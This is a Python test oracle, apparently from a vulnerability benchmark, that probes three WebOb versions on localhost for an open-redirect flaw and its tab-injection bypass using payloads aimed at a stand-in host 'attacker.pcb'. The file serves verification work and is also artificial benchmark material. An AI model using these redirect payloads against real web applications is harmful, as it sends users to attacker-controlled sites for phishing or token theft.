"""
Benign open-redirect canary oracle for webob-cve-2026-44889.

Flow (external HTTP, real WebOb server):
  GET /redirect?to=<payload>  -> 302 with a `Location` header produced by the
  REAL WebOb Response._make_location_absolute normalization.

Detection (redirect-canary, oracle variant A):
  Parse the emitted Location header. The redirect is an OPEN redirect iff the
  resolved host is the ATTACKER origin `attacker.pcb` (off the server origin)
  AND the per-run ${PCB_FLAG} appears in the Location. If WebOb neutralized the
  payload, the host stays the server's own 127.0.0.1 (relative/same-origin) and
  the flag does not escape to an attacker host -> BLOCKED.

Nothing is planted in app code or data: the flag is only a label inside the
attacker redirect host path; it reaches the Location solely when the real
WebOb normalization is bypassed.
"""
import http.client
import os
import sys
from urllib.parse import urlsplit, quote

ATTACKER_HOST = "attacker.pcb"


def _payloads(flag):
    """Return (name, raw redirect-target) pairs. FLAG lives in the attacker path."""
    tail = "//{host}/{flag}".format(host=ATTACKER_HOST, flag=flag)
    return {
        # CVE-2024-42353 original: protocol-relative //attacker
        "original": tail,
        # CVE-2026-44889 residual: TAB-injected /\t/attacker ; urlsplit (py3.10+)
        # strips the tab, re-forming //attacker AFTER WebOb's // check.
        "residual": "/\t/{host}/{flag}".format(host=ATTACKER_HOST, flag=flag),
    }


def fetch_location(base_url, raw_target):
    """GET /redirect?to=<raw_target> (url-encoded) WITHOUT following redirects;
    return (status, location_header)."""
    parts = urlsplit(base_url)
    conn = http.client.HTTPConnection(parts.hostname, parts.port, timeout=15)
    # quote() with empty safe set -> tab becomes %09, slashes %2F, etc.
    q = quote(raw_target, safe="")
    conn.request("GET", "/redirect?to=" + q)
    resp = conn.getresponse()
    loc = resp.getheader("Location")
    status = resp.status
    resp.read()
    conn.close()
    return status, loc


def reaches_attacker(location, flag):
    """True iff Location is an OPEN redirect to the attacker origin carrying FLAG."""
    if not location:
        return False
    host = (urlsplit(location).hostname or "").lower()
    return host == ATTACKER_HOST and flag in location


def probe(base_url, flag, which):
    raw = _payloads(flag)[which]
    status, loc = fetch_location(base_url, raw)
    reached = reaches_attacker(loc, flag)
    return {
        "which": which,
        "base_url": base_url,
        "sent_to_param": raw.replace("\t", "\\t"),
        "status": status,
        "location": loc,
        "reaches_attacker": reached,
    }


def _pp(tag, r):
    print("  [%s] to=%r -> %s Location=%r  reaches_attacker=%s"
          % (tag, r["sent_to_param"], r["status"], r["location"], r["reaches_attacker"]))


def main():
    flag = os.environ.get("PCB_FLAG", "PCBFLAG_LOCAL_TEST")
    v0 = os.environ.get("V0_URL", "http://127.0.0.1:45210")
    v1 = os.environ.get("V1_URL", "http://127.0.0.1:45211")
    v2 = os.environ.get("V2_URL", "http://127.0.0.1:45212")

    print("=== webob-cve-2026-44889 open-redirect canary gate (flag=%s) ===" % flag)

    print("V0 (WebOb 1.8.7, %s):" % v0)
    o_v0 = probe(v0, flag, "original"); _pp("original", o_v0)
    r_v0 = probe(v0, flag, "residual"); _pp("residual", r_v0)

    print("V1 (WebOb 1.8.8, %s):" % v1)
    o_v1 = probe(v1, flag, "original"); _pp("original", o_v1)
    r_v1 = probe(v1, flag, "residual"); _pp("residual", r_v1)

    print("V2 (WebOb 1.8.10, %s):" % v2)
    o_v2 = probe(v2, flag, "original"); _pp("original", o_v2)
    r_v2 = probe(v2, flag, "residual"); _pp("residual", r_v2)

    gate = {
        "original_poc_reaches_flag_on_v0": o_v0["reaches_attacker"],
        "original_poc_blocked_on_v1": not o_v1["reaches_attacker"],
        "bypass_poc_reaches_flag_on_v1": r_v1["reaches_attacker"],
        "bypass_blocked_on_v2": not r_v2["reaches_attacker"],
    }
    gate["passed"] = all(gate.values())
    print("\n=== GATE ===")
    for k, v in gate.items():
        print("  %-38s %s" % (k, v))
    print("PASSED" if gate["passed"] else "FAILED")
    return 0 if gate["passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
